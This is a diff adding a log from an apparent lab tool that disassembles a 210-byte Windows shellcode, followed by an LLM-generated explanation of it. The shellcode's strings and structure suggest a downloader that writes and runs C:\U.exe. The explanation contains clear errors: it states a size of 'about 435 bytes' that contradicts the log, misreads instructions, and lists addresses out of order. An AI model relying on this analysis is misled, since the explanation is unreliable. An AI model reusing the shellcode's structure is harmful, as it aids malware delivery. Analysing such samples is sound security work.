@@ -1,0 +1,202 @@
+root@75c1a6848de5:/tp# PYTHONPATH=/tp/src:/tp python3 /tp/src/tp2/main.py -f /tp/shellcode.txt
+2026-03-15 13:55:10,803 - TP2 - INFO - Testing shellcode of size 210B
+2026-03-15 13:55:10,831 - TP2 - INFO - Shellcode analysed!
+No pylibemu output
+2026-03-15 13:55:10,831 - TP2 - INFO - Shellcode instructions:
+0x1000: jmp     0x1056
+0x1002: mov     esi, dword ptr [ebp + 0x3c]
+0x1005: mov     esi, dword ptr [ebp + esi + 0x78]
+0x1009: add     esi, ebp
+0x100b: push    esi
+0x100c: mov     esi, dword ptr [esi + 0x20]
+0x100f: add     esi, ebp
+0x1011: xor     ecx, ecx
+0x1013: dec     ecx
+0x1014: inc     ecx
+0x1015: lodsd   eax, dword ptr [esi]
+0x1016: xor     ebx, ebx
+0x1018: or      dh, byte ptr [esi]
+0x101a: movsx   edx, byte ptr [eax + ebp]
+0x101e: cmp     dl, dh
+0x1020: je      0x102a
+0x1022: ror     ebx, 0xd
+0x1025: add     ebx, edx
+0x1027: inc     eax
+0x1028: jmp     0x1019
+0x102a: cmp     ebx, edi
+0x102c: jne     0x1015
+0x102e: pop     esi
+0x102f: mov     ebx, dword ptr [esi + 0xa]
+0x1032: and     al, 3
+0x1034: frstor  dword ptr [esi - 0x75]
+0x1037: or      al, 0x4b
+0x1039: mov     ebx, dword ptr [esi + 0x1c]
+0x103c: add     ebx, ebp
+0x103e: mov     eax, dword ptr [ebx + ecx*4]
+0x1041: add     eax, ebp
+0x1043: ret
+0x1044: jne     0x10b8
+0x1046: insb    byte ptr es:[edi], dx
+0x1047: insd    dword ptr es:[edi], dx
+0x1048: outsd   dx, dword ptr [esi]
+0x1049: outsb   dx, byte ptr [esi]
+0x104a: or      ch, byte ptr [esi]
+0x104c: insb    byte ptr es:[edi], dx
+0x104e: insb    byte ptr es:[edi], dx
+0x104f: add     byte ptr [ebx + 0x3a], al
+0x1052: pop     esp
+0x1053: push    ebp
+0x1054: js      0x10bd
+0x1058: add     byte ptr [ebx], dh
+0x105a: shl     byte ptr [ebx + eax + 0x40], 0x30
+0x105f: js      0x106d
+0x1061: mov     eax, dword ptr [eax + 0xa]
+0x1064: or      al, 0x8b
+0x1066: jo      0x1084
+0x1068: lodsd   eax, dword ptr [esi]
+0x1069: mov     eax, dword ptr [eax + 8]
+0x106c: jmp     0x1077
+0x106e: mov     eax, dword ptr [eax + 0x34]
+0x1071: lea     eax, [eax + 0x7c]
+0x1074: mov     eax, dword ptr [eax + 0x3c]
+0x1077: xchg    ebp, eax
+0x1078: mov     edi, 0xa0e4e8e
+0x107d: in      al, dx
+0x107e: call    0x1007
+0x1083: sub     esp, 4
+0x1086: sub     dword ptr [esp], 0x3c
+0x108a: call    eax
+0x108c: xchg    ebp, eax
+0x108d: push    eax
+0x108e: mov     edi, 0x702f1a36
+0x1093: call    0xffff1b07
+0x1098: dec     dword ptr [ebx - 0x7203dbac]
+0x109e: push    edx
+0x109f: mov     edx, 0x5353db33
+0x10a4: push    edx
+0x10a5: jmp     0x10cb
+0x10a7: push    ebx
+0x10a8: call    eax
+0x10aa: pop     ebp
+0x10ab: mov     edi, 0x8a0afe98
+0x10b0: push    cs
+0x10b1: call    0x1009
+0x10b6: sub     esp, 4
+0x10b9: sub     dword ptr [esp], 0x62
+0x10bd: call    eax
+0x10bf: mov     edi, 0x73e2d87e
+0x10c4: call    0xff0b1009
+0x10c9: call    dword ptr [edx - 1]
+0x10cc: shr     al, 1
+0x10ce: xlatb
+2026-03-15 13:55:13,008 - TP2 - INFO - Explication LLM : Analysis of the shellcode:
+
+### Overview
+
+The shellcode appears to be written in x86 assembly language and is approximately 0x10CB bytes long (about 435 bytes). The primary goal of the shellcode is to inject and execute shellcode.
+
+### Strings
+
+The extracted strings are:
+
+* `urlmon`: a reference to a component in the Windows operating system, possibly related to DLL loading.
+* `.dll`: a common file extension for dynamic link libraries.
+* `C:\U.exe`: a file path that suggests the shellcode is trying to load a payload from an executable file.
+
+### Disassembly
+
+Breaking down the disassembly:
+
+1. **Initial Jumps and Movements**
+   ```assembly
+0x1000: jmp 0x1056
+0x1002: mov esi, dword ptr [ebp + 0x3c]
+0x1005: mov esi, dword ptr [ebp + esi + 0x78]
+0x1009: add esi, ebp
+0x100b: push esi
+```
+   - The code starts by executing an indirect jump to 0x1056.
+   - It then loads the address of `ebp + 0x3c` into `esi`, then updates `esi` to `[ebp + esi + 0x78]`, and then moves it to `ebp`.
+   - The value in `esi` is pushed onto the stack.
+
+2. **Looping and Operations**
+   ```assembly
+0x101c: lodsd eax, dword ptr [esi]
+0x1015: xor ebx, ebx
+0x1018: or dh, byte ptr [esi]
+0x101a: movsx edx, byte ptr [eax + ebp]
+0x101e: cmp dl, dh
+0x1020: je 0x102a
+0x1022: ror ebx, 0xd
+0x1025: add ebx, edx
+0x1027: inc eax
+0x1028: jmp 0x1019
+```
+   - This section of code seems to be a loop that processes data in memory.
+   - It loads a dword from `[esi]` into `eax`, then it checks whether the lower byte and high byte of `[esi]` are equal.
+   - Based on this comparison, either the code rotates `ebx`, adds to `ebx`, or does not do any additional operation.
+
+3. **DLL Loading**
+   ```assembly
+0x1022: ror ebx, 0xd
+0x1025: add ebx, edx
+0x1027: inc eax
+0x1028: jmp 0x1019
+0x102a: cmp ebx, edi
+0x102c: jne 0x1015
+0x102e: pop esi
+0x1032: and al, 3
+0x1034: frstor dword ptr [esi - 0x75]
+0x1037: or al, 0x4b
+0x1039: mov ebx, dword ptr [esi + 0x1c]
+0x103c: add ebx, ebp
+0x103e: mov eax, dword ptr [ebx + ecx*4]
+0x1041: add eax, ebp
+0x1043: ret
+```
+   - After the comparison, if they are equal, `ebx` is incremented and added to `edx`.
+   - It then pops `esi` from the stack.
+   - The code then retrieves `dword ptr [esi + 0x1c]` and adds it to `ebp`, storing it in `ebx`.
+   - It gets the value at `ebx + ecx*4` and adds it to `ebp`, then returns.
+
+4. **Execution**
+   ```assembly
+0x1083: sub esp, 4
+0x1086: sub dword ptr [esp], 0x3c
+0x108a: call eax
+0x108c: xchg ebp, eax
+0x108d: push eax
+0x108e: mov edi, 0x702f1a36
+0x1093: call 0xffff1b07
+0x1098: dec dword ptr [ebx - 0x7203dbac]
+0x109e: push edx
+0x109f: mov edx, 0x5353db33
+0x10a4: push edx
+0x10a5: jmp 0x10cb
+```
+   - The code then creates a call to the address pointed to by `eax`.
+   - It also executes a `push eax` and then calls to `edi 0x702f1a36` at the address `0xffff1b07`.
+   - The code seems to perform several operations including pushing and popping values.
+
+5. **Payload Execution**
+   ```assembly
+0x10aa: pop ebp
+0x10ab: mov edi, 0x8a0afe98
+0x10b0: push cs
+0x10b1: call 0x1009
+0x10b6: sub esp, 4
+0x10b9: sub dword ptr [esp], 0x62
+0x10bd: call eax
+0x10bf: mov edi, 0x73e2d87e
+0x10c4: call 0xff0b1009
+0x10c9: call dword ptr [edx - 1]
+0x10cc: shr al, 1
+0x10ce: xlatb
+```
+   - The code then pops `ebp` from the stack and retrieves the address `0x8a0afe98`.
+   - It pushes `cs` (code segment) and calls to `edi 0x8a0afe98` at the address `0x1009`.
+   - The code then executes several operations, including subtractions from the stack, a call to `edi 0x8a0afe98` from the same location again, a shift of an `al` value, and finally executes an xlatb instruction.
+
+### Conclusion
+
+Based on the disassembly and extracted strings, the code appears to be an injector that loads and executes shellcode. The shellcode uses various Windows kernel functions to load and execute its payload.
